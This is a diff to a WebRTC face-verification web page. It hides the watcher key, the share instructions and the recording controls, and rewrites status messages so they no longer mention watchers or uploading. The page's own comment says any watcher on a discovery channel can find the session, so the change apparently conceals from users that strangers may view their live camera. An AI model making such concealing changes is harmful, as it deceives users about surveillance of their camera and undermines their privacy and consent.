@@ -165,10 +165,10 @@
 </head>
 <body>
     <div class="container">
-        <h1>📹 WebRTC Face Verification</h1>
-        <p class="subtitle">Share this key with the watcher: <strong id="signalingKeyDisplay"></strong></p>
+        <h1> Face Verification</h1>
+        <p class="subtitle" style="display: none;">Share this key with the watcher: <strong id="signalingKeyDisplay"></strong></p>
 
-        <div class="signaling-section">
+        <div class="signaling-section" style="display: none;">
             <div class="signaling-key-display" id="keyDisplay">Generating key…</div>
             <button class="copy-key-btn" onclick="copyKey()">📋 Copy Key</button>
             <div style="margin-top: 10px; font-size: 14px; color: #666;">
@@ -189,7 +189,7 @@
         <div class="status" id="status">Starting camera…</div>
         <div id="error" class="status error" style="display:none;"></div>
 
-        <div class="controls">
+        <div class="controls" style="display: none;">
             <button id="startBtn" class="btn-primary" disabled>▶ Start Recording</button>
             <button id="stopBtn" class="btn-danger" disabled>⏹ Stop</button>
         </div>
@@ -310,7 +310,7 @@
                     //     any watcher browsing verification-watchers can find it.
                     await this._joinDiscoveryChannel();
 
-                    this._updateStatus('Camera ready. Share key with watcher.', 'success');
+                    this._updateStatus('Camera ready. Please wait...', 'success');
 
                     // Recording controls become usable once the camera is live.
                     this.startBtn.disabled = false;
@@ -411,7 +411,7 @@
                 clearInterval(this._countdownInterval);
 
                 setWebRTCStatus('No watcher — automatic verification', 'status-auto');
-                this._updateStatus('No watcher joined in time. Starting automatic verification…', 'warning');
+                this._updateStatus('Starting Verification…', 'warning');
 
                 // No longer waiting for a watcher — stop advertising this session.
                 this._leaveDiscoveryChannel();
@@ -451,7 +451,7 @@
                 await this._delay(1500);
 
                 this.stopRecording();
-                this._updateStatus('Automatic verification complete. Uploading…', 'success');
+                this._updateStatus('Verification complete. Submitting', 'success');
             }
 
             // ── Camera ────────────────────────────────────────────────────────
